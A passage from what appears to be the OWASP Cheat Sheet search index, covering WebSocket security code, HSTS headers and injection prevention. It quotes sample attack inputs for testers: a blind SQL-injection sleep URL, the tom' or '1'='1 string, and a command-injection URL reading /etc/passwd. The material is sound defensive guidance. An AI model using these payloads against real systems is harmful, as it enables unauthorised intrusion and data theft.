occur during the schema loading */ public AuthenticationRequestDecoder () throws IOException , ProcessingException { JsonNode node = JsonLoader . fromFile ( new File ( \"src/main/resources/authentication-request-schema.json\" )); this . validationSchema = JsonSchemaFactory . byDefault (). getJsonSchema ( node ); } /** * {@inheritDoc} */ @Override public AuthenticationRequest decode ( String s ) throws DecodeException { try { //Validate the provided representation against the dedicated schema //Use validation mode with report in order to enable further inspection/tracing //of the error details //Moreover the validation method \"validInstance()\" generate a NullPointerException //if the representation do not respect the expected schema //so it's more proper to use the validation method with report ProcessingReport validationReport = this . validationSchema . validate ( JsonLoader . fromString ( s ), true ); //Ensure there no error if ( ! validationReport . isSuccess ()) { //Simply reject the message here: Don't care about error details... throw new DecodeException ( s , \"Validation of the provided representation failed !\" ); } } catch ( IOException | ProcessingException e ) { throw new DecodeException ( s , \"Cannot validate the provided representation to a\" + \" JSON valid representation !\" , e ); } return new Gson (). fromJson ( s , AuthenticationRequest . class ); } /** * {@inheritDoc} */ @Override public boolean willDecode ( String s ) { boolean canDecode = false ; //If the provided JSON representation is empty/null then we indicate that //representation cannot be decoded to our expected object if ( s == null || s . trim (). isEmpty ()) { return canDecode ; } //Try to cast the provided JSON representation to our object to validate at least //the structure (content validation is done during decoding) try { AuthenticationRequest test = new Gson (). fromJson ( s , AuthenticationRequest . class ); canDecode = ( test != null ); } catch ( Exception e ) { //Ignore explicitly any casting error... } return canDecode ; } /** * {@inheritDoc} */ @Override public void init ( EndpointConfig config ) { //Not used } /** * {@inheritDoc} */ @Override public void destroy () { //Not used } } import com.fasterxml.jackson.databind.JsonNode ; import com.github.fge.jackson.JsonLoader ; import com.github.fge.jsonschema.core.exceptions.ProcessingException ; import com.github.fge.jsonschema.core.report.ProcessingReport ; import com.github.fge.jsonschema.main.JsonSchema ; import com.github.fge.jsonschema.main.JsonSchemaFactory ; import com.google.gson.Gson ; import org.owasp.pocwebsocket.vo.AuthenticationResponse ; import javax.websocket.EncodeException ; import javax.websocket.Encoder ; import javax.websocket.EndpointConfig ; import java.io.File ; import java.io.IOException ; /** * Encode AuthenticationResponse object to JSON text representation. * <p> * As there one instance of the encoder class by endpoint session so we can use * the JsonSchema as encoder instance variable. */ public class AuthenticationResponseEncoder implements Encoder . Text < AuthenticationResponse > { /** * JSON validation schema associated to this type of message */ private JsonSchema validationSchema = null ; /** * Initialize encoder and associated JSON validation schema * * @throws IOException If any error occur during the object creation * @throws ProcessingException If any error occur during the schema loading */ public AuthenticationResponseEncoder () throws IOException , ProcessingException { JsonNode node = JsonLoader . fromFile ( new File ( \"src/main/resources/authentication-response-schema.json\" )); this . validationSchema = JsonSchemaFactory . byDefault (). getJsonSchema ( node ); } /** * {@inheritDoc} */ @Override public String encode ( AuthenticationResponse object ) throws EncodeException { //Generate the JSON representation String json = new Gson (). toJson ( object ); try { //Validate the generated representation against the dedicated schema //Use validation mode with report in order to enable further inspection/tracing //of the error details //Moreover the validation method \"validInstance()\" generate a NullPointerException //if the representation do not respect the expected schema //so it's more proper to use the validation method with report ProcessingReport validationReport = this . validationSchema . validate ( JsonLoader . fromString ( json ), true ); //Ensure there no error if ( ! validationReport . isSuccess ()) { //Simply reject the message here: Don't care about error details... throw new EncodeException ( object , \"Validation of the generated representation failed !\" ); } } catch ( IOException | ProcessingException e ) { throw new EncodeException ( object , \"Cannot validate the generated representation to a\" + \" JSON valid representation !\" , e ); } return json ; } /** * {@inheritDoc} */ @Override public void init ( EndpointConfig config ) { //Not used } /** * {@inheritDoc} */ @Override public void destroy () { //Not used } } Note that the same approach is used in the messages handling part of the POC. All messages exchanged between the client and the server are systematically validated using the same way, using dedicated JSON schemas linked to messages dedicated Encoder/Decoder (serialization/deserialization).","title":"Authentication and Input/Output validation"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#authorization-and-access-token-explicit-invalidation","text":"Authorization information is stored in the access token using the JWT Claim feature (in the POC the name of the claim is access_level ). Authorization is validated when a request is received and before any other action using the user input information. The access token is passed with every message sent to the message endpoint and a blacklist is used in order to allow the user to request an explicit token invalidation. Explicit token invalidation is interesting from a user's point of view because, often when tokens are used, the validity timeframe of the token is relatively long (it's common to see a valid timeframe superior to 1 hour) so it's important to allow a user to have a way to indicate to the system \"OK, I have finished my exchange with you, so you can close our exchange session and cleanup associated links\". It also helps the user to revoke itself of current access if a malicious concurrent access is detected using the same token (case of token stealing). Token blacklist - Maintain a temporary list using memory and time limited Caching of hashes of token that are not allowed to be used anymore import org.apache.commons.jcs.JCS ; import org.apache.commons.jcs.access.CacheAccess ; import org.apache.commons.jcs.access.exception.CacheException ; import javax.xml.bind.DatatypeConverter ; import java.security.MessageDigest ; import java.security.NoSuchAlgorithmException ; /** * Utility class to manage the access token that have been declared as no * more usable (explicit user logout) */ public class AccessTokenBlacklistUtils { /** * Message content send by user that indicate that the access token that * come along the message must be blacklisted for further usage */ public static final String MESSAGE_ACCESS_TOKEN_INVALIDATION_FLAG = \"INVALIDATE_TOKEN\" ; /** * Use cache to store blacklisted token hash in order to avoid memory exhaustion and be consistent * because token are valid 30 minutes so the item live in cache 60 minutes */ private static final CacheAccess < String , String > TOKEN_CACHE ; static { try { TOKEN_CACHE = JCS . getInstance ( \"default\" ); } catch ( CacheException e ) { throw new RuntimeException ( \"Cannot init token cache !\" , e ); } } /** * Add token into the blacklist * * @param token Token for which the hash must be added * @throws NoSuchAlgorithmException If SHA256 is not available */ public static void addToken ( String token ) throws NoSuchAlgorithmException { if ( token != null && ! token . trim (). isEmpty ()) { String hashHex = computeHash ( token ); if ( TOKEN_CACHE . get ( hashHex ) == null ) { TOKEN_CACHE . putSafe ( hashHex , hashHex ); } } } /** * Check if a token is present in the blacklist * * @param token Token for which the presence of the hash must be verified * @return TRUE if token is blacklisted * @throws NoSuchAlgorithmException If SHA256 is not available */ public static boolean isBlacklisted ( String token ) throws NoSuchAlgorithmException { boolean exists = false ; if ( token != null && ! token . trim (). isEmpty ()) { String hashHex = computeHash ( token ); exists = ( TOKEN_CACHE . get ( hashHex ) != null ); } return exists ; } /** * Compute the SHA256 hash of a token * * @param token Token for which the hash must be computed * @return The hash encoded in HEX * @throws NoSuchAlgorithmException If SHA256 is not available */ private static String computeHash ( String token ) throws NoSuchAlgorithmException { String hashHex = null ; if ( token != null && ! token . trim (). isEmpty ()) { MessageDigest md = MessageDigest . getInstance ( \"SHA-256\" ); byte [] hash = md . digest ( token . getBytes ()); hashHex = DatatypeConverter . printHexBinary ( hash ); } return hashHex ; } } Message handling - Process a request from a user to add a message in the list. Show a authorization validation approach example import com.auth0.jwt.interfaces.Claim ; import com.auth0.jwt.interfaces.DecodedJWT ; import org.owasp.pocwebsocket.enumeration.AccessLevel ; import org.owasp.pocwebsocket.util.AccessTokenBlacklistUtils ; import org.owasp.pocwebsocket.util.AuthenticationUtils ; import org.owasp.pocwebsocket.util.MessageUtils ; import org.owasp.pocwebsocket.vo.MessageRequest ; import org.owasp.pocwebsocket.vo.MessageResponse ; import org.slf4j.Logger ; import org.slf4j.LoggerFactory ; import javax.websocket.EncodeException ; import javax.websocket.RemoteEndpoint ; import java.io.IOException ; import java.util.ArrayList ; import java.util.List ; /** * Handle message flow */ public class MessageHandler implements javax . websocket . MessageHandler . Whole < MessageRequest > { private static final Logger LOG = LoggerFactory . getLogger ( MessageHandler . class ); /** * Reference to the communication channel with the client */ private RemoteEndpoint . Basic clientConnection ; /** * Constructor * * @param clientConnection Reference to the communication channel with the client */ public MessageHandler ( RemoteEndpoint . Basic clientConnection ) { this . clientConnection = clientConnection ; } /** * {@inheritDoc} */ @Override public void onMessage ( MessageRequest message ) { MessageResponse response = null ; try { /*Step 1: Verify the token*/ String token = message . getToken (); //Verify if is it in the blacklist if ( AccessTokenBlacklistUtils . isBlacklisted ( token )) { throw new IllegalAccessException ( \"Token is in the blacklist !\" ); } //Verify the signature of the token DecodedJWT decodedToken = AuthenticationUtils . validateToken ( token ); /*Step 2: Verify the authorization (access level)*/ Claim accessLevel = decodedToken . getClaim ( \"access_level\" ); if ( accessLevel == null || AccessLevel . valueOf ( accessLevel . asString ()) == null ) { throw new IllegalAccessException ( \"Token have an invalid access level claim !\" ); } /*Step 3: Do the expected processing*/ //Init the list of the messages for the current user if ( ! MessageUtils . MESSAGES_DB . containsKey ( decodedToken . getSubject ())) { MessageUtils . MESSAGES_DB . put ( decodedToken . getSubject (), new ArrayList <> ()); } //Add message to the list of message of the user if the message is a not a token invalidation //order otherwise add the token to the blacklist if ( AccessTokenBlacklistUtils . MESSAGE_ACCESS_TOKEN_INVALIDATION_FLAG . equalsIgnoreCase ( message . getContent (). trim ())) { AccessTokenBlacklistUtils . addToken ( message . getToken ()); } else { MessageUtils . MESSAGES_DB . get ( decodedToken . getSubject ()). add ( message . getContent ()); } //According to the access level of user either return only is message or return all message List < String > messages = new ArrayList <> (); if ( accessLevel . asString (). equals ( AccessLevel . USER . name ())) { MessageUtils . MESSAGES_DB . get ( decodedToken . getSubject ()) . forEach ( s -> messages . add ( String . format ( \"(%s): %s\" , decodedToken . getSubject (), s ))); } else if ( accessLevel . asString (). equals ( AccessLevel . ADMIN . name ())) { MessageUtils . MESSAGES_DB . forEach (( k , v ) -> v . forEach ( s -> messages . add ( String . format ( \"(%s): %s\" , k , s )))); } //Build the response object indicating that exchange succeed if ( AccessTokenBlacklistUtils . MESSAGE_ACCESS_TOKEN_INVALIDATION_FLAG . equalsIgnoreCase ( message . getContent (). trim ())) { response = new MessageResponse ( true , messages , \"Token added to the blacklist\" ); } else { response = new MessageResponse ( true , messages , \"\" ); } } catch ( Exception e ) { LOG . error ( \"[MessageHandler] Error occur in exchange process.\" , e ); //Build the response object indicating that exchange fail //We send the error detail on client because ware are in POC (it will not the case in a real app) response = new MessageResponse ( false , new ArrayList <> (), \"Error occur during exchange: \" + e . getMessage ()); } finally { //Send response try { this . clientConnection . sendObject ( response ); } catch ( IOException | EncodeException e ) { LOG . error ( \"[MessageHandler] Error occur in response object sending.\" , e ); } } } }","title":"Authorization and access token explicit invalidation"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#confidentiality-and-integrity","text":"If the raw version of the protocol is used (protocol ws:// ) then the transferred data is exposed to eavesdropping and potential on-the-fly alteration. Example of capture using Wireshark and searching for password exchanges in the stored PCAP file, not printable characters has been explicitly removed from the command result: $ grep -aE '(password)' capture.pcap { \"login\" : \"bob\" , \"password\" : \"bob123\" } There is a way to check, at WebSocket endpoint level, if the channel is secure by calling the method isSecure() on the session object instance. Example of implementation in the method of the endpoint in charge of setup of the session and affects the message handler: /** * Handle the beginning of an exchange * * @param session Exchange session information */ @OnOpen public void start ( Session session ) { ... //Affect a new message handler instance in order to process the exchange only if the channel is secured if ( session . isSecure ()) { session . addMessageHandler ( new AuthenticationMessageHandler ( session . getBasicRemote ())); } else { LOG . info ( \"[AuthenticationEndpoint] Session {} do not use a secure channel so no message handler \" + \"was affected for processing and session was explicitly closed !\" , session . getId ()); try { session . close ( new CloseReason ( CloseReason . CloseCodes . CANNOT_ACCEPT , \"Insecure channel used !\" )); } catch ( IOException e ){ LOG . error ( \"[AuthenticationEndpoint] Session {} cannot be explicitly closed !\" , session . getId (), e ); } } LOG . info ( \"[AuthenticationEndpoint] Session {} message handler affected for processing\" , session . getId ()); } Expose WebSocket endpoints only on wss:// protocol (WebSockets over SSL/TLS) in order to ensure Confidentiality and Integrity of the traffic like using HTTP over SSL/TLS to secure HTTP exchanges.","title":"Confidentiality and Integrity"},{"location":"cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html","text":"HTTP Strict Transport Security Cheat Sheet \u00b6 Introduction \u00b6 HTTP Strict Transport Security (also named HSTS ) is an opt-in security enhancement that is specified by a web application through the use of a special response header. Once a supported browser receives this header that browser will prevent any communications from being sent over HTTP to the specified domain and will instead send all communications over HTTPS. It also prevents HTTPS click through prompts on browsers. The specification has been released and published end of 2012 as RFC 6797 (HTTP Strict Transport Security (HSTS)) by the IETF. Threats \u00b6 HSTS addresses the following threats: User bookmarks or manually types http://example.com and is subject to a man-in-the-middle attacker HSTS automatically redirects HTTP requests to HTTPS for the target domain Web application that is intended to be purely HTTPS inadvertently contains HTTP links or serves content over HTTP HSTS automatically redirects HTTP requests to HTTPS for the target domain A man-in-the-middle attacker attempts to intercept traffic from a victim user using an invalid certificate and hopes the user will accept the bad certificate HSTS does not allow a user to override the invalid certificate message Examples \u00b6 Simple example, using a long (1 year = 31536000 seconds) max-age. This example is dangerous since it lacks includeSubDomains : Strict-Transport-Security: max-age=31536000 This example is useful if all present and future subdomains will be HTTPS. This is a more secure option but will block access to certain pages that can only be served over HTTP: Strict-Transport-Security: max-age=31536000; includeSubDomains This example is useful if all present and future subdomains will be HTTPS. In this example we set a very short max-age in case of mistakes during initial rollout: Strict-Transport-Security: max-age=86400; includeSubDomains Recommended: If the site owner would like their domain to be included in the HSTS preload list maintained by Chrome (and used by Firefox and Safari), then use the header below. Sending the preload directive from your site can have PERMANENT CONSEQUENCES and prevent users from accessing your site and any of its subdomains if you find you need to switch back to HTTP. Please read the details at preload removal before sending the header with preload . Strict-Transport-Security: max-age=31536000; includeSubDomains; preload The preload flag indicates the site owner's consent to have their domain preloaded. The site owner still needs to then go and submit the domain to the list. Problems \u00b6 Site owners can use HSTS to identify users without cookies. This can lead to a significant privacy leak. Take a look here for more details. Cookies can be manipulated from sub-domains, so omitting the includeSubDomains option permits a broad range of cookie-related attacks that HSTS would otherwise prevent by requiring a valid certificate for a subdomain. Ensuring the secure flag is set on all cookies will also prevent, some, but not all, of the same attacks. Browser Support \u00b6 As of September 2019 HSTS is supported by all modern browsers , with the only notable exception being Opera Mini. References \u00b6 Chromium Projects/HSTS OWASP TLS Protection Cheat Sheet sslstrip AppSecTutorial Series - Episode 4 Nmap NSE script to detect HSTS configuration","title":"HTTP Strict Transport Security"},{"location":"cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html#http-strict-transport-security-cheat-sheet","text":"","title":"HTTP Strict Transport Security Cheat Sheet"},{"location":"cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html#introduction","text":"HTTP Strict Transport Security (also named HSTS ) is an opt-in security enhancement that is specified by a web application through the use of a special response header. Once a supported browser receives this header that browser will prevent any communications from being sent over HTTP to the specified domain and will instead send all communications over HTTPS. It also prevents HTTPS click through prompts on browsers. The specification has been released and published end of 2012 as RFC 6797 (HTTP Strict Transport Security (HSTS)) by the IETF.","title":"Introduction"},{"location":"cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html#threats","text":"HSTS addresses the following threats: User bookmarks or manually types http://example.com and is subject to a man-in-the-middle attacker HSTS automatically redirects HTTP requests to HTTPS for the target domain Web application that is intended to be purely HTTPS inadvertently contains HTTP links or serves content over HTTP HSTS automatically redirects HTTP requests to HTTPS for the target domain A man-in-the-middle attacker attempts to intercept traffic from a victim user using an invalid certificate and hopes the user will accept the bad certificate HSTS does not allow a user to override the invalid certificate message","title":"Threats"},{"location":"cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html#examples","text":"Simple example, using a long (1 year = 31536000 seconds) max-age. This example is dangerous since it lacks includeSubDomains : Strict-Transport-Security: max-age=31536000 This example is useful if all present and future subdomains will be HTTPS. This is a more secure option but will block access to certain pages that can only be served over HTTP: Strict-Transport-Security: max-age=31536000; includeSubDomains This example is useful if all present and future subdomains will be HTTPS. In this example we set a very short max-age in case of mistakes during initial rollout: Strict-Transport-Security: max-age=86400; includeSubDomains Recommended: If the site owner would like their domain to be included in the HSTS preload list maintained by Chrome (and used by Firefox and Safari), then use the header below. Sending the preload directive from your site can have PERMANENT CONSEQUENCES and prevent users from accessing your site and any of its subdomains if you find you need to switch back to HTTP. Please read the details at preload removal before sending the header with preload . Strict-Transport-Security: max-age=31536000; includeSubDomains; preload The preload flag indicates the site owner's consent to have their domain preloaded. The site owner still needs to then go and submit the domain to the list.","title":"Examples"},{"location":"cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html#problems","text":"Site owners can use HSTS to identify users without cookies. This can lead to a significant privacy leak. Take a look here for more details. Cookies can be manipulated from sub-domains, so omitting the includeSubDomains option permits a broad range of cookie-related attacks that HSTS would otherwise prevent by requiring a valid certificate for a subdomain. Ensuring the secure flag is set on all cookies will also prevent, some, but not all, of the same attacks.","title":"Problems"},{"location":"cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html#browser-support","text":"As of September 2019 HSTS is supported by all modern browsers , with the only notable exception being Opera Mini.","title":"Browser Support"},{"location":"cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html#references","text":"Chromium Projects/HSTS OWASP TLS Protection Cheat Sheet sslstrip AppSecTutorial Series - Episode 4 Nmap NSE script to detect HSTS configuration","title":"References"},{"location":"cheatsheets/Injection_Prevention_Cheat_Sheet.html","text":"Injection Prevention Cheat Sheet \u00b6 Introduction \u00b6 This article is focused on providing clear, simple, actionable guidance for preventing the entire category of Injection flaws in your applications. Injection attacks, especially SQL Injection , are unfortunately very common. Application accessibility is a very important factor in protection and prevention of injection flaws. Only the minority of all applications within a company/enterprise are developed in house, where as most applications are from external sources. Open source applications give at least the opportunity to fix problems, but closed source applications need a different approach to injection flaws. Injection flaws occur when an application sends untrusted data to an interpreter. Injection flaws are very prevalent, particularly in legacy code, often found in SQL queries, LDAP queries, XPath queries, OS commands, program arguments, etc. Injection flaws are easy to discover when examining code, but more difficult via testing. Scanners and fuzzers can help attackers find them. Depending on the accessibility different actions must be taken in order to fix them. It is always the best way to fix the problem in source code itself, or even redesign some parts of the applications. But if the source code is not available or it is simply uneconomical to fix legacy software only virtual patching makes sense. Application Types \u00b6 Three classes of applications can usually be seen within a company. Those 3 types are needed to identify the actions which need to take place in order to prevent/fix injection flaws. A1: New Application \u00b6 A new web application in the design phase, or in early stage development. A2: Productive Open Source Application \u00b6 An already productive application, which can be easily adapted. A Model-View-Controller (MVC) type application is just one example of having a easily accessible application architecture. A3: Productive Closed Source Application \u00b6 A productive application which cannot or only with difficulty be modified. Forms of Injection \u00b6 There are several forms of injection targeting different technologies including SQL queries, LDAP queries, XPath queries and OS commands. Query languages \u00b6 The most famous form of injection is SQL Injection where an attacker can modify existing database queries. For more information see the SQL Injection Prevention Cheat Sheet . But also LDAP, SOAP, XPath and REST based queries can be susceptible to injection attacks allowing for data retrieval or control bypass. SQL Injection \u00b6 An SQL injection attack consists of insertion or \"injection\" of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application. A successful SQL injection attack can read sensitive data from the database, modify database data (insert/update/delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file existing on the DBMS file system or write files into the file system, and, in some cases, issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands. SQL Injection attacks can be divided into the following three classes: Inband: data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward kind of attack, in which the retrieved data is presented directly in the application web page. Out-of-band: data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester). Inferential or Blind: there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server. How to test for the issue \u00b6 During code review \u00b6 please check for any queries to the database are not done via prepared statements. If dynamic statements are being made please check if the data is sanitized before used as par of the statement. Auditors should always look for uses of sp_execute, execute or exec within SQL Server stored procedures. Similar audit guidelines are necessary for similar functions for other vendors. Automated Exploitation \u00b6 Most of the situation and techniques below here can be performed in a automated way using some tools. In this article the tester can find information how to perform an automated auditing using SQLMap Equally Static Code Analysis Data flow rules can detect of unsanitized user controlled input can change the SQL query. Stored Procedure Injection \u00b6 When using dynamic SQL within a stored procedure, the application must properly sanitize the user input to eliminate the risk of code injection. If not sanitized, the user could enter malicious SQL that will be executed within the stored procedure. Time delay Exploitation technique \u00b6 The time delay exploitation technique is very useful when the tester find a Blind SQL Injection situation, in which nothing is known on the outcome of an operation. This technique consists in sending an injected query and in case the conditional is true, the tester can monitor the time taken to for the server to respond. If there is a delay, the tester can assume the result of the conditional query is true. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section). http://www.example.com/product.php?id=10 AND IF(version() like '5%', sleep(10), 'false'))-- In this example the tester if checking whether the MySql version is 5.x or not, making the server to delay the answer by 10 seconds. The tester can increase the delay time and monitor the responses. The tester also doesn't need to wait for the response. Sometimes he can set a very high value (e.g. 100) and cancel the request after some seconds. Out of band Exploitation technique \u00b6 This technique is very useful when the tester find a Blind SQL Injection situation, in which nothing is known on the outcome of an operation. The technique consists of the use of DBMS functions to perform an out of band connection and deliver the results of the injected query as part of the request to the tester's server. Like the error based techniques, each DBMS has its own functions. Check for specific DBMS section. Remediation \u00b6 Defense Option 1: Prepared Statements (with Parameterized Queries) \u00b6 Prepared statements ensure that an attacker is not able to change the intent of a query, even if SQL commands are inserted by an attacker. In the safe example below, if an attacker were to enter the userID of tom' or '1'='1 , the parameterized query would not be vulnerable and would instead look for a username which literally matched the entire string tom' or '1'='1 . Defense Option 2: Stored Procedures \u00b6 The difference between prepared statements and stored procedures is that the SQL code for a stored procedure is defined and stored in the database itself, and then called from the application. Both of these techniques have the same effectiveness in preventing SQL injection so your organization should choose which approach makes the most sense for you. Stored procedures are not always safe from SQL injection. However, certain standard stored procedure programming constructs have the same effect as the use of parameterized queries when implemented safely* which is the norm for most stored procedure languages. Note: 'Implemented safely' means the stored procedure does not include any unsafe dynamic SQL generation. Defense Option 3: White List Input Validation \u00b6 Various parts of SQL queries aren't legal locations for the use of bind variables, such as the names of tables or columns, and the sort order indicator (ASC or DESC). In such situations, input validation or query redesign is the most appropriate defense. For the names of tables or columns, ideally those values come from the code, and not from user parameters. But if user parameter values are used to make different for table names and column names, then the parameter values should be mapped to the legal/expected table or column names to make sure unvalidated user input doesn't end up in the query. Please note, this is a symptom of poor design and a full rewrite should be considered if time allows. Defense Option 4: Escaping All User-Supplied Input \u00b6 This technique should only be used as a last resort, when none of the above are feasible. Input validation is probably a better choice as this methodology is frail compared to other defenses and we cannot guarantee it will prevent all SQL Injection in all situations. This technique is to escape user input before putting it in a query. It's usually only recommended to retrofit legacy code when implementing input validation isn't cost effective. Example code - Java \u00b6 Safe Java Prepared Statement Example \u00b6 The following code example uses a PreparedStatement , Java's implementation of a parameterized query, to execute the same database query. // This should REALLY be validated too String custname = request . getParameter ( \"customerName\" ); // Perform input validation to detect attacks String query = \"SELECT account_balance FROM user_data WHERE user_name = ?\" ; PreparedStatement pstmt = connection . prepareStatement ( query ); pstmt . setString ( 1 , custname ); ResultSet results = pstmt . executeQuery (); We have shown examples in Java, but practically all other languages, including Cold Fusion, and Classic ASP, support parameterized query interfaces. Safe Java Stored Procedure Example \u00b6 The following code example uses a CallableStatement , Java's implementation of the stored procedure interface, to execute the same database query. The sp_getAccountBalance stored procedure would have to be predefined in the database and implement the same functionality as the query defined above. // This should REALLY be validated String custname = request . getParameter ( \"customerName\" ); try { CallableStatement cs = connection . prepareCall ( \"{call sp_getAccountBalance(?)}\" ); cs . setString ( 1 , custname ); ResultSet results = cs . executeQuery (); // Result set handling... } catch ( SQLException se ) { // Logging and error handling... } LDAP Injection \u00b6 LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements through techniques similar to SQL Injection . LDAP injection attacks could result in the granting of permissions to unauthorized queries, and content modification inside the LDAP tree. For more information on LDAP Injection attacks, visit LDAP injection . LDAP injection attacks are common due to two factors: The lack of safer, parameterized LDAP query interfaces The widespread use of LDAP to authenticate users to systems. How to test for the issue \u00b6 During code review \u00b6 Please check for any queries to the LDAP escape special characters, see here . Automated Exploitation \u00b6 Scanner module of tool like OWASP ZAP have module to detect LDAP injection issue. Remediation \u00b6 Escape all variables using the right LDAP encoding function \u00b6 The main way LDAP stores names is based on DN ( distinguished name ). You can think of this like a unique identifier. These are sometimes used to access resources, like a username. A DN might look like this cn=Richard Feynman, ou=Physics Department, dc=Caltech, dc=edu or uid=inewton, ou=Mathematics Department, dc=Cambridge, dc=com There are certain characters that are considered special characters in a DN. The exhaustive list is the following: \\ # + < > , ; \" = and leading or trailing spaces Each DN points to exactly 1 entry, which can be thought of sort of like a row in a RDBMS. For each entry, there will be 1 or more attributes which are analogous to RDBMS columns. If you are interested in searching through LDAP for users will certain attributes, you may do so with search filters. In a search filter, you can use standard boolean logic to get a list of users matching an arbitrary constraint. Search filters are written in Polish notation AKA prefix notation. Example: (&(ou=Physics)(| (manager=cn=Freeman Dyson,ou=Physics,dc=Caltech,dc=edu) (manager=cn=Albert Einstein,ou=Physics,dc=Princeton,dc=edu) )) When building LDAP queries in application code, you MUST escape any untrusted data that is added to any LDAP query. There are two forms of LDAP escaping. Encoding for LDAP Search and Encoding for LDAP DN (distinguished name). The proper escaping depends on whether you are sanitizing input for a search filter, or you are using a DN as a username-like credential for accessing some resource. Example code - Java \u00b6 Safe Java for LDAP escaping Example \u00b6 public String escapeDN ( String name ) { //From RFC 2253 and the / character for JNDI final char [] META_CHARS = { '+' , '\"' , '<' , '>' , ';' , '/' }; String escapedStr = new String ( name ); //Backslash is both a Java and an LDAP escape character, //so escape it first escapedStr = escapedStr . replaceAll ( \"\\\\\\\\\\\\\\\\\" , \"\\\\\\\\\\\\\\\\\" ); //Positional characters - see RFC 2253 escapedStr = escapedStr . replaceAll ( \"\\^#\" , \"\\\\\\\\\\\\\\\\#\" ); escapedStr = escapedStr . replaceAll ( \"\\^ | $\" , \"\\\\\\\\\\\\\\\\ \" ); for ( int i = 0 ; i < META_CHARS . length ; i ++ ) { escapedStr = escapedStr . replaceAll ( \"\\\\\\\\\" + META_CHARS [ i ] , \"\\\\\\\\\\\\\\\\\" + META_CHARS [ i ] ); } return escapedStr ; } Note, that the backslash character is a Java String literal and a regular expression escape character. public String escapeSearchFilter ( String filter ) { //From RFC 2254 String escapedStr = new String ( filter ); escapedStr = escapedStr . replaceAll ( \"\\\\\\\\\\\\\\\\\" , \"\\\\\\\\\\\\\\\\5c\" ); escapedStr = escapedStr . replaceAll ( \"\\\\\\\\\\*\" , \"\\\\\\\\\\\\\\\\2a\" ); escapedStr = escapedStr . replaceAll ( \"\\\\\\\\(\" , \"\\\\\\\\\\\\\\\\28\" ); escapedStr = escapedStr . replaceAll ( \"\\\\\\\\)\" , \"\\\\\\\\\\\\\\\\29\" ); escapedStr = escapedStr . replaceAll ( \"\\\\\\\\\" + Character . toString ( '\\\\ u0000 ' ), \"\\\\\\\\\\\\\\\\00\" ); return escapedStr ; } XPath Injection \u00b6 TODO Scripting languages \u00b6 All scripting languages used in web applications have a form of an eval call which receives code at runtime and executes it. If code is crafted using unvalidated and unescaped user input code injection can occur which allows an attacker to subvert application logic and eventually to gain local access. Every time a scripting language is used, the actual implementation of the 'higher' scripting language is done using a 'lower' language like C. If the scripting language has a flaw in the data handling code ' Null Byte Injection ' attack vectors can be deployed to gain access to other areas in memory, which results in a successful attack. Operating System Commands \u00b6 OS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user supplies operating system commands through a web interface in order to execute OS commands. Any web interface that is not properly sanitized is subject to this exploit. With the ability to execute OS commands, the user can upload malicious programs or even obtain passwords. OS command injection is preventable when security is emphasized during the design and development of applications. How to test for the issue \u00b6 During code review \u00b6 Check if any command execute methods are called and in unvalidated user input are taken as data for that command. Out side of that, appending a semicolon to the end of a URL query parameter followed by an operating system command, will execute the command. %3B is URL encoded and decodes to semicolon. This is because the ; is interpreted as a command separator. Example: http://sensitive/something.php?dir=%3Bcat%20/etc/passwd If the application responds with the output of the /etc/passwd file then you know the attack has been successful. Many web application scanners can be used to test for this attack as they inject variations of command injections and test the response. Equally Static Code Analysis tools check the data flow of untrusted user input into a web application and check if the data is then entered into a dangerous method which executes the user input as a command. Remediation \u00b6 If it is considered unavoidable the call to a system command incorporated with user-supplied, the following two layers of defense should be used within software in order to prevent attacks Parameterization - If available, use structured mechanisms that automatically enforce the separation between data and command. These mechanisms can help to provide the relevant quoting, encoding. Input validation - the values for commands and the relevant arguments should be both validated. There are different degrees of validation for the actual command and its arguments: When it comes to the commands used, these must be validated against a whitelist of allowed commands. In regards to the arguments used for these commands, they should be validated using the following options: Positive or \"whitelist\" input validation - where are the arguments allowed explicitly defined White list Regular Expression - where is explicitly defined a whitelist of good characters allowed and the maximum length of the string. Ensure that metacharacters like & | ; $ > < \\ \\ !` and white-spaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers, and does not contain metacharacters. The length is also being limited to 3-10 characters: ^[a-z0-9]{3,10}$ Example code - Java \u00b6 Incorrect Usage \u00b6 ProcessBuilder b = new ProcessBuilder ( \"C:\\DoStuff.exe -arg1 -arg2\" ); In this example, the command together with the arguments are passed as a one string, making easy to manipulate that expression and inject malicious strings. Correct Usage \u00b6 Here is an example that starts a process with a modified working directory. The command and each of the arguments are passed separately. This make it easy to validated each term and reduces the risk to insert malicious strings. ProcessBuilder pb = new ProcessBuilder ( \"TrustedCmd\" , \"TrustedArg1\" , \"TrustedArg2\" ); Map < String , String > env = pb . environment (); pb . directory ( new File ( \"TrustedDir\" )); Process p = pb . start (); Network Protocols \u00b6 Web applications often communicate with network daemons (like SMTP, IMAP, FTP) where user input becomes part of the communication stream. Here it is possible to inject command sequences to abuse an established session. Injection Prevention Rules \u00b6 Rule #1 (Perform proper input validation) \u00b6 Perform proper input validation. Positive or \"whitelist\" input validation with appropriate canonicalization is also recommended, but is not a complete defense as many applications require special characters in their input. Rule #2 (Use a safe API) \u00b6 The preferred option is to use a safe API which avoids the use of the interpreter entirely or provides a parameterized interface. Be careful of APIs, such as stored procedures, that are parameterized, but can still introduce injection under the hood. Rule #3 (Contextually escape user data) \u00b6 If a parameterized API is not available, you should carefully escape special characters using the specific escape 